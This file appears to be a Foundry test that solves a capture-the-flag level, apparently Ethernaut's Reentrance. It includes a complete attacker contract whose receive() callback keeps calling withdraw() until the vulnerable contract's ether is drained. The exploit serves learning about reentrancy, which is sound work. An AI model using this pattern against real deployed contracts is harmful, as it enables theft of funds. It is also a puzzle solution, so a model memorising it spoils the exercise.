// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Reentrance, ReentranceFactory} from "../helpers/ReentranceFactory.sol";

contract ReentranceLevel is SetUpLevelTest {
    Reentrance internal reentrance;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        playerBalance = 0.01 ether;
        instanceBalance = 0.001 ether;
        level = address(new ReentranceFactory());
        super.setUp();
        reentrance = Reentrance(payable(instance));

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        ReentranceAttack reAttack = new ReentranceAttack(
            payable(address(reentrance))
        );
        reAttack.denoteAndWithdraw{value: 0.001 ether}();
        vm.stopPrank();
    }
}

contract ReentranceAttack {
    Reentrance re;

    constructor(address payable _target) {
        re = Reentrance(_target);
    }

    function denoteAndWithdraw() public payable {
        re.donate{value: msg.value}(address(this));
        re.withdraw(msg.value);
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        assert(success);
    }

    receive() external payable {
        if (address(re).balance >= msg.value) {
            re.withdraw(msg.value);
        }
    }
}
